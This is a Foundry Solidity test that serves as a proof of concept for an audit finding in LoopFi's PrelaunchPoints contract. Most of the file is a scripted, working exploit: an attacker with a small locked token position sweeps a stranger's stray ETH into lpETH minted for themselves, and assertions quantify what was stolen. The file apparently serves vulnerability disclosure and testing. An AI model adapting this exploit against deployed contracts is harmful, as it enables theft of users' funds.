// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

import {PrelaunchPoints} from "../src/loop/PrelaunchPoints.sol";
import {ILpETH} from "../src/loop/interfaces/ILpETH.sol";
import {ILpETHVault} from "../src/loop/interfaces/ILpETHVault.sol";
import {MockLpETH} from "../src/loop/mock/MockLpETH.sol";
import {MockLpETHVault} from "../src/loop/mock/MockLpETHVault.sol";
import {LRToken} from "../src/loop/mock/MockLRT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Minimal stand-in for the truly-external, out-of-scope 0x ExchangeProxy.
/// PrelaunchPoints treats it as an opaque swap venue: it approves the proxy to
/// pull the sell-token, then low-level-calls it with the 0x `_data` blob. This
/// double honours that exact interface — it pulls `inputTokenAmount` of the
/// sell-token (decoded from the real TransformERC20 calldata layout the audited
/// `_decodeTransformERC20Data` expects) and returns the swapped ETH 1:1. The
/// vulnerable accounting under test lives entirely in the REAL PrelaunchPoints.
contract MockExchangeProxy {
    // 0x `_data` layout consumed by PrelaunchPoints._decodeTransformERC20Data:
    //   [0..4)    selector (TRANSFORM_SELECTOR)
    //   [4..36)   inputToken   (sell token)
    //   [36..68)  outputToken  (ETH sentinel)
    //   [68..100) inputTokenAmount
    fallback() external payable {
        address inputToken;
        uint256 amount;
        assembly {
            inputToken := calldataload(4)
            amount := calldataload(68)
        }
        // Pull the sell token using the approval PrelaunchPoints just granted.
        IERC20(inputToken).transferFrom(msg.sender, address(this), amount);
        // Return the swapped ETH (modelled 1:1) to the caller = PrelaunchPoints.
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "swap eth send failed");
    }

    receive() external payable {}
}

/// @title  LoopFi PrelaunchPoints — H-01: "availability of deposit invariant can be bypassed"
/// @notice Real audited PrelaunchPoints. The LRT claim path sets
///         `claimedAmount = address(this).balance` (PrelaunchPoints.sol:262), so it
///         mints lpETH for ANY ETH sitting in the contract, not just the ETH bought
///         from the caller's own LRT swap. An attacker with a tiny locked LRT
///         position sweeps unrelated ETH held by the contract into freshly minted
///         lpETH for themselves — breaking both the "deposits close at activation"
///         and the "1:1 conversion" invariants.
contract PoC_33354_LoopFi is Test {
    address internal constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    bytes4 internal constant TRANSFORM_SELECTOR = 0x415565b0;
    bytes32 internal constant REF = bytes32(uint256(1));

    PrelaunchPoints internal prelaunch;
    MockExchangeProxy internal exchange;
    MockLpETH internal lpETH;
    MockLpETHVault internal vault;
    LRToken internal lrt;

    address internal owner = address(this);
    address internal attacker = address(0xA11ACC);
    address internal stranger = address(0x57A417); // whose stray ETH gets stolen

    function setUp() public {
        exchange = new MockExchangeProxy();
        vm.deal(address(exchange), 1_000 ether); // swap venue liquidity

        lrt = new LRToken();

        address[] memory allowed = new address[](1);
        allowed[0] = address(lrt);
        prelaunch = new PrelaunchPoints(address(exchange), WETH, allowed);

        lpETH = new MockLpETH();
        vault = new MockLpETHVault();
    }

    /// Builds the exact 0x TransformERC20 `_data` blob that the audited
    /// `_validateData` / `_decodeTransformERC20Data` accept for a sale of
    /// `_token` (output = ETH), selling `_amount` units.
    function _transformData(address _token, uint256 _amount) internal pure returns (bytes memory) {
        return abi.encodePacked(
            TRANSFORM_SELECTOR,
            uint256(uint160(_token)), // inputToken  (left-padded address)
            uint256(uint160(ETH)), // outputToken (ETH sentinel)
            _amount // inputTokenAmount
        );
    }

    function test_H01_disallowedDepositAndTheftViaBalanceClaim() public {
        uint256 attackerLrt = 1 ether; // attacker's genuine locked position
        uint256 strayETH = 10 ether; // unrelated ETH held by the contract

        // --- 1. Attacker locks a small LRT position while deposits are open ---
        lrt.mint(attacker, attackerLrt);
        vm.startPrank(attacker);
        lrt.approve(address(prelaunch), attackerLrt);
        prelaunch.lock(address(lrt), attackerLrt, REF);
        vm.stopPrank();
        assertEq(prelaunch.balances(attacker, address(lrt)), attackerLrt, "lock failed");

        // --- 2. Owner closes the deposit window (sets lpETH addresses) ---
        prelaunch.setLoopAddresses(address(lpETH), address(vault));
        // Deposits are now CLOSED: a plain lockETH must revert.
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunch.lockETH{value: 1 ether}(REF);

        // --- 3. Pass the 7-day timelock and convert (no ETH locked -> balance 0) ---
        vm.warp(block.timestamp + 7 days + 1);
        prelaunch.convertAllETH();
        assertEq(address(prelaunch).balance, 0, "convert should have swept all ETH");
        assertGt(block.timestamp, prelaunch.loopActivation(), "deposits are closed");

        // --- 4. Stray ETH lands in the contract AFTER the window closed ---
        // Per PrelaunchPoints.receive(): "ETH sent to this contract directly will be
        // locked forever." The stranger loses it... unless the bug lets it be swept.
        vm.warp(block.timestamp + 1);
        vm.deal(stranger, strayETH);
        vm.prank(stranger);
        (bool ok,) = address(prelaunch).call{value: strayETH}("");
        require(ok, "stray donation failed");
        assertEq(address(prelaunch).balance, strayETH, "stray ETH not held");

        uint256 attackerLpBefore = lpETH.balanceOf(attacker);

        // --- 5. Attacker claims their 1-LRT position ---
        // Real swap yields 1 ETH, but claimedAmount = address(this).balance = 11 ETH.
        bytes memory data = _transformData(address(lrt), attackerLrt);
        vm.prank(attacker);
        prelaunch.claim(address(lrt), 100, PrelaunchPoints.Exchange.TransformERC20, data);

        // --- 6. Harm, with numbers ---
        uint256 minted = lpETH.balanceOf(attacker) - attackerLpBefore;
        uint256 fairFromSwap = attackerLrt; // 1:1 swap of the locked LRT
        uint256 stolen = minted - fairFromSwap;

        emit log_named_decimal_uint("lpETH minted to attacker ", minted, 18);
        emit log_named_decimal_uint("fair (1:1 swap) entitlement", fairFromSwap, 18);
        emit log_named_decimal_uint("stolen stray ETH (excess) ", stolen, 18);

        // 1:1 conversion invariant broken: minted 11 lpETH from a 1-LRT position.
        assertEq(minted, attackerLrt + strayETH, "claimedAmount != swap+stray");
        assertGt(minted, fairFromSwap, "no over-mint");
        assertEq(stolen, strayETH, "attacker did not capture the stray ETH");
        // The stranger's supposedly locked-forever ETH is gone from the contract.
        assertEq(address(prelaunch).balance, 0, "stray ETH not swept");
        // Attacker's lpETH is fully redeemable 1:1 -> 10 ETH free profit.
        assertEq(lpETH.balanceOf(attacker), 11 ether, "attacker lpETH");
    }
}
